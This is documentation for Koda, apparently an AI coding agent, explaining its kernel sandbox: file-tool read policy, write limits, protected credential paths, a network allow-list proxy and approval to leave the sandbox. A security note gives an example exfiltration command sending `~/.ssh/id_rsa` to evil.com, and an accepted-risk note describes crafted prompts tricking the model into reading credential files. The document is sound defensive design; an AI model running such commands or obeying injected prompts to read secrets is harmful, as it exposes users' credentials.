# Sandbox

Koda's kernel sandbox is **always active** — every Bash command runs
inside a sandboxed process. The sandbox decides what a command can do: in
Auto a command that stays inside it runs without asking, and one that needs
more asks to leave it. The [trust mode](./approval.md) picks the sandbox:
Auto's can write the project, Plan's keeps it read-only and has no network.

## File tool read policy

Koda's **Read, List, Grep, and Glob** tools are intentionally unrestricted —
they can access any path on the filesystem the OS permits, including paths
outside the project directory (e.g. `../other-repo`, `~/.ssh/config`).

Only **Write and Edit** are gated to the project root. Deleting goes
through Bash, inside the kernel sandbox.

### Why reads are unrestricted

1. **Reads cannot mutate state.** The worst-case outcome of an out-of-scope
   read is that the model sees something sensitive in its context window — which
   you, watching the terminal, can also see. No irreversible damage occurs.

2. **Bash already has the same reach.** The Bash tool runs inside the kernel
   sandbox but has read access to the full filesystem. Restricting the Read
   tool while leaving Bash unrestricted is security theater — the model just
   falls back to `cat ../secret.txt`.

3. **OS-level sandboxing is the real boundary.** On macOS (Seatbelt) and Linux
   (bwrap), the sandbox already defines what the process can access at the
   kernel level. Duplicating that check in the tool layer adds friction without
   adding protection.

4. **Cross-repo workflows are common.** Developers routinely ask koda to read
   a sibling repo, a shared library, or a dotfile — restricting this forces
   awkward workarounds.

   This follows the Claude Code approach — Claude Code's `Read` tool imposes
   no project-root scope check at all.

### Accepted risk

> ⚠️ **A carefully crafted prompt could trick the model into reading and
> summarising sensitive files** — for example `~/.aws/credentials`,
> `~/.ssh/id_rsa`, or `~/.netrc` — without explicit user consent. The
> content would appear in the chat window but not be exfiltrated unless
> the model also makes a network request (Bash + `curl`, WebFetch, etc.).
>
> **Mitigations:**
> - Those files are **write-protected** by the kernel sandbox, so the model
>   cannot modify or delete them.
> - Network exfiltration via Bash is constrained by the sandbox's outbound
>   network policy: commands reach only the hosts Koda's proxy allows, and
>   a command that asks to leave the sandbox waits for your approval.
>
> If you work with highly sensitive secrets and want file-level read
> protection, run koda in a containerised environment with access to only
> the files you intend to expose.


### Write restrictions

Bash commands can only write to:
- The project directory, except `.git`, which is read-only
- `/tmp` and standard cache dirs (`~/.cache`, `~/.cargo`, etc.)

In Plan the project is read-only too, and a command has no network at all,
not even through the proxy, as in Codex's read-only sandbox.

`.git` is read-only as it is in Codex's workspace-write sandbox, so a
command can't rewrite history or the repository's config. `git status`,
`git diff` and `git log` run; `git add`, `git commit`, `git checkout` and
`git stash` write to `.git` and fail inside the sandbox. The model then asks
to run them outside it (see
[When a command needs to leave the sandbox](#when-a-command-needs-to-leave-the-sandbox)).

The in-process file tools (`Write`, `Edit`) enforce the
same perimeter via `safe_resolve_path` (logical check) and
`koda_sandbox::fs::verify_mutation_safe` (canonicalizing
symlink-aware check). The two layer: the first rejects literal
`../etc/passwd` style escapes, the second rejects symlink escapes
(the final path component being a symlink to outside, or any
parent directory being one).

The symlink check runs in-process, so it holds even when the
kernel sandbox is unavailable. In-project symlinks (e.g. `examples/latest -> v3/`) keep working;
only links whose canonical target escapes every allowed root are
rejected.

### Terminals

A command started with `tty: true` ([Typing into a
command](tools.md#typing-into-a-command)) gets a terminal Koda opens for it
before entering the sandbox. The sandbox lets that command read, write and
configure that one terminal, and `/dev/tty`, which for it is the same
terminal. No other command gets either, and no command can open any other
terminal device, yours included. On macOS this is two rules added to that
command's profile; on Linux, bwrap's own `/dev` already holds nothing else.

### Credential protection

Credential directories and files are **write-protected** — sandboxed
commands cannot modify them, but CLI tools can still *read* their own
config to authenticate. This follows the Codex model where the entire
host filesystem is read-only and credential dirs are not special-cased
beyond that.

**Write-protected directories** (reads allowed):
- `~/.ssh` — SSH private keys
- `~/.aws` — AWS credentials
- `~/.gnupg` — GPG private keys
- `~/.kube` — Kubernetes config and tokens
- `~/.azure` — Azure CLI tokens
- `~/.password-store` — pass(1) encrypted passwords
- `~/.terraform.d` — Terraform cloud tokens
- `~/.claude` — Claude Code settings and session tokens
- `~/.android` — Android SDK debug keystores and signing keys
- `~/.config/gcloud` — gcloud CLI credentials
- `~/.config/gh` — GitHub CLI PATs
- `~/.config/op` — 1Password CLI tokens
- `~/.config/helm` — Helm registry auth
- `~/.config/netlify` — Netlify CLI access tokens
- `~/.config/vercel` — Vercel CLI credentials
- `~/.config/fly` — Fly.io CLI auth tokens
- `~/.config/doppler` — Doppler secrets manager tokens
- `~/.config/stripe` — Stripe CLI API keys
- `~/.config/heroku` — Heroku CLI OAuth tokens

**Write-protected files** (reads allowed):
`~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`,
`~/.docker/config.json`, `~/.vault-token`, `~/.env`

**Fully blocked (read + write):**
- `~/.config/koda/db` — Koda's SQLite DB containing plaintext API keys
- `~/.config/koda/mcp_oauth` — MCP servers' OAuth tokens (`koda mcp login`)
- `~/.config/koda/serve` — the [shared server](./serve.md#the-shared-server)'s
  socket, which a command can't connect to either: a client of the server can
  answer approvals and change the config. Codex closes its daemon's the same
  way. A socket given with `koda serve --listen` is closed to that server's own
  sessions.

The three are closed under `$XDG_CONFIG_HOME/koda` too, when that is set. A
command can still connect to other Unix sockets (`ssh-agent`, Docker).

> **Security note — accepted risk:** A sandboxed command can read
> credential material and could exfiltrate it over the network (e.g.
> `curl https://evil.com -d @~/.ssh/id_rsa`). Blocking credential
> reads without blocking network egress is security theater — the
> model could also obtain tokens from environment variables, process
> output, or tool-specific commands like `gh auth token`. Network-level
> egress restriction is the proper mitigation, and Koda's proxy provides
> it: sandboxed commands reach only the hosts it allows.
>
> The only exception is `koda/db` — koda's own API keys have no
> legitimate use inside the sandbox (the koda process runs *outside*
> the sandbox), so full read+write deny is justified.

### Agent-file and git protection

In all modes, writes to `.koda/agents/` and `.koda/skills/` within the
project are blocked. This prevents a sandboxed command from modifying
agent definitions that could alter system prompts or tool access. Writes
to `.git/hooks/` and `.git/config` are blocked too: both can name programs
git runs outside the sandbox at the next commit.

The folders above them can't be moved or replaced either, so a command
can't rename `.git` and make a new one without the protection. On macOS the
profile refuses to rename or remove `.git`, `.koda` and the project folder,
as Codex's does for the folders above its read-only paths. On Linux `.git`
and `.koda` are mounted onto themselves, and the kernel won't rename a mount
point.

## Sub-agent inheritance

Child agents inherit the parent's trust mode and sandbox via
`TrustMode::clamp()` — a child can never run with less protection than
its caller. If the parent runs in Plan mode, the child runs in Plan mode
even if the agent JSON specifies `"trust": "auto"`.

Within that clamp, a sub-agent's calls go through the same rules as the main
agent's and its commands through the same proxy, and what would ask asks in
the main session, naming the agent. See
[Sub-agents ask in the main session](./approval.md#sub-agents-ask-in-the-main-session).

## Platform backends

| Platform | Backend | Install |
|----------|---------|---------|
| macOS | `sandbox-exec` (seatbelt) | Built-in |
| Linux | `bwrap` (bubblewrap) | `apt install bubblewrap` |
| Windows | Not supported | — |

If the platform backend is unavailable (e.g. `bwrap` not installed on
Linux), nothing contains a command:

- **Auto mode**: every command and every edit asks first, as Claude Code
  does with its sandbox off. "This session" covers the exact command, or
  the file for Edit and Write.
- **Plan mode**: shell commands are refused, since no sandbox keeps them
  read-only, and so is a search through `grep` or `find`; `Read` still
  works.

When the sandbox is there but can't be set up for one command (a project
path the macOS profile can't name, such as one with a `"` in it, or Linux's
`koda-sandbox-stage2` helper missing), that command is refused in every
mode with the reason, rather than run without the sandbox.

The TUI status bar shows the sandbox state next to the trust badge
(🛡 sandboxed / ⚠ unsandboxed), and `/feedback`'s diagnostics record
it for a bug report. Clients read it from Koda's host (`state/read`'s
`sandbox`, with a `setupHint` when it's unavailable), since commands
run in the host's sandbox.

## When a command needs to leave the sandbox

Bash commands reach the network only through Koda's proxy, which lets
through GitHub and the main package registries. Servers on your local
network and on `localhost` are unreachable from inside the sandbox.

### A host that isn't on the list

When a command reaches for another host, Koda asks, as Codex's managed
proxy does. The question is the command's own, with the host:

```
  Bash  Network access to docs.rs:443 (not on the allow-list)
  [y] approve  [s] docs.rs this session  [n] reject  [f] feedback  [esc] stop
```

- **`y`** lets this connection through. The next connection to the host
  asks again; connections opened while the question is up share its answer.
- **`s`** lets every later connection to the host, on that protocol and
  port, through for the session.
- **`n`** refuses it and stops the command, and the model is told the
  network access was denied.

The question belongs to the command that opened the connection when exactly
one command (`Bash`, `Monitor` or `Cargo`, a sub-agent's included) is
running. With none running (a server started in the background, say), it
names no command, and is asked only while a turn runs. With several at once
(a parallel batch), the host is refused without asking, since stopping one
of them would be a guess. With nobody to ask (`koda exec`), it is refused,
and the command goes on without it. All of this is Codex's managed proxy's
behaviour. A command that ends takes its question with it.

The proxy matches hosts, not ports, as
Anthropic's sandbox-runtime does for an entry without one: an allowed host
is reachable on any port, so a command that tunnels SSH through the proxy
can reach `github.com:22`. `~/.ssh` is readable (see "Credential
protection"), though `SSH_AUTH_SOCK` is removed, so an agent's keys aren't
offered. Plain `ssh` and `git` over SSH, which don't use the proxy, fail.

One exception: a command can connect to a `localhost` port that a server
Koda started with `background: true` is listening on, so "start the dev
server, then curl it" works without leaving the sandbox. Every other local
port stays closed, including servers you started yourself, databases, and a
server a test starts and then connects to.

To open every local port on macOS, both ways, set it in your config file,
as Codex keeps `allow_local_binding` in its config:

```toml
# ~/.config/koda/config.toml
[sandbox]
allow_local_binding = true
```

`-c sandbox.allow_local_binding=true` does the same for one run.

A command can then reach any server listening on your machine, such as a
database or LM Studio, and accept connections on any port, from other
machines too if it listens on more than loopback. Connections beyond your
machine still go only through Koda's proxy. It is off by default, as
Codex's and Claude Code's `allow_local_binding` are, and only your own config
file or `-c` can turn it on: Koda reads no project settings. On Linux each
command has a loopback of its own that it can always use, so the setting
changes nothing there.

How Koda finds those servers differs by platform:

- **macOS:** Before each Bash call, Koda reads the ports from the
  background command's process group with `lsof`.
- **Linux:** Each command runs in its own network namespace, so a background
  server listens on a loopback no other command shares.
  - The background command's sandbox serves its namespace on a Unix socket
    that only you can open.
  - Before each Bash call, Koda asks that socket which ports are listening.
  - The new command's sandbox opens those ports on its own loopback and
    forwards each connection through the socket.
  - This works for a server started with `background: true`, not one
    started with `&` inside an ordinary call: that call's sandbox stops
    serving its namespace when the call ends.
  - Codex and Claude Code don't bridge namespaces, so on Linux a later
    command can't reach a background server at all.

When a command you need fails because of that, such as `git push` to an SSH
remote, the model asks to run that one command outside the sandbox: a Bash
call with `outside_sandbox: true` and a `reason`. Koda shows the command and
the reason and waits for you; Plan refuses it:

```text
  Bash  ⚠ outside the sandbox  git push origin main
  why: Push the commit to origin over SSH, which the sandbox blocks
  [y] approve  [n] reject  [f] feedback  [esc] stop
```

The command then runs as it would in your own shell, with no sandbox and no
proxy. Each such call asks again, unless the model proposed a `prefix_rule`
with it, such as `["git", "commit"]`: then `[s] this session` covers every
later command with that prefix that leaves the sandbox. A prefix that would
cover any program (`bash`, `python -c`, `sudo`, `git` alone) isn't offered,
and a destructive command still asks every time (see
[Allow for this session](./approval.md#allow-for-this-session)). A sub-agent
asks in the main session; headless runs have no one to ask, so they're refused, and after a denial
they're told the command can't leave the sandbox in that run. Codex
(`require_escalated`) and Claude Code (`dangerouslyDisableSandbox`) do the
same.

## Where sub-agents write

The **sandbox backend** (above) restricts what a sub-agent's commands can
do. Its writes land in the project, like the main agent's and like Claude
Code's and Codex's sub-agents; what would ask asks in the main session. In
Plan sub-agents are read-only, and the kernel sandbox keeps the project
read-only for their commands.

An agent can ask for a worktree of its own with `"isolation": "worktree"`
in its JSON. When a worktree holds work at the end, Koda commits what isn't
committed, removes the worktree and keeps the branch. It tells you the
branch name, and tells the main agent too. A worktree with no new work is
removed along with its branch.

A worktree is a fresh checkout of `HEAD`, so it doesn't have your
uncommitted edits, untracked files or build output. A sub-agent there can't
run `git add` or `git commit`, because git keeps a worktree's index and refs
under the main repository's `.git`, which is outside its write root. Koda
commits for it at the end.

Koda's own git commands (making and removing worktrees, that commit, the git
context at session start, `/diff`) run outside the sandbox, so they run
none of the programs a repository's config can name: hooks, an fsmonitor,
clean and smudge filters, an external diff or a textconv, as in Codex and
Claude Code. One result: a worktree has Git LFS pointer files rather than
the files themselves; run `git lfs pull` in it if a sub-agent needs them.

Worktrees live outside the project, in Koda's config folder:
`~/.config/koda/worktrees/agents/<project>/<slot>`, as Codex keeps its
worktrees outside the repository. So nothing a repository commits (a
symlinked folder, say) decides where a worktree, and the sub-agent's write
access, goes; Koda also refuses a worktree path that resolves outside that
folder. A worktree git won't remove stays where it is, named in the log:
Koda removes worktrees only through `git worktree remove`.

Outside a git repository there are no worktrees. A sub-agent that needs one
doesn't start, and the main agent is told why, so it can do the work itself.
Sub-agents without `"isolation": "worktree"` write in the project as usual.

Sub-agents in the project share it with each other. The main agent is told
to give each one files no other is touching.

Agents in Plan trust always use the project, in every mode.
